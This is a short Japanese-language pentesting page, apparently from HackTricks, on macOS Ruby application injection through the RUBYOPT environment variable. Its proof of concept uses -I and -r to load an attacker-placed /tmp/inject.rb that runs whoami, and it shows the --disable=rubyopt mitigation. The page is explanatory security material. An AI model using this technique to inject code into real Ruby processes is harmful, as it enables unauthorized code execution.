# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Rubyは、scriptを実行する前に、`RUBYOPT`環境変数からサポートされているコマンドラインスイッチを解析します。Rubyは`RUBYOPT`内で`-e`によるcode executionを拒否しますが、`-I`はlibrary-search directoryを先頭に追加でき、`-r`はlibraryをrequireできます。そのため、attacker-controlledなenvironment variablesを使用してRubyを起動するprocessは、attacker-controlledなRuby codeをloadするように仕向けられます。<sup>[[1]](#references)</sup>

`/tmp/inject.rb`を作成します。
```ruby:inject.rb
puts `whoami`
```
`hello.rb` のような無害な Ruby スクリプトを作成します：
```ruby:hello.rb
puts 'Hello, World!'
```
制御された `RUBYOPT` 値で実行します：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
この動作を無効にするには、スクリプト名の**前に**`--disable=rubyopt`（または`--disable-rubyopt`）を渡します。<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` の後に記述されたオプションはスクリプトに `ARGV` として渡され、Ruby による `RUBYOPT` の先行処理を無効にすることはありません。<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
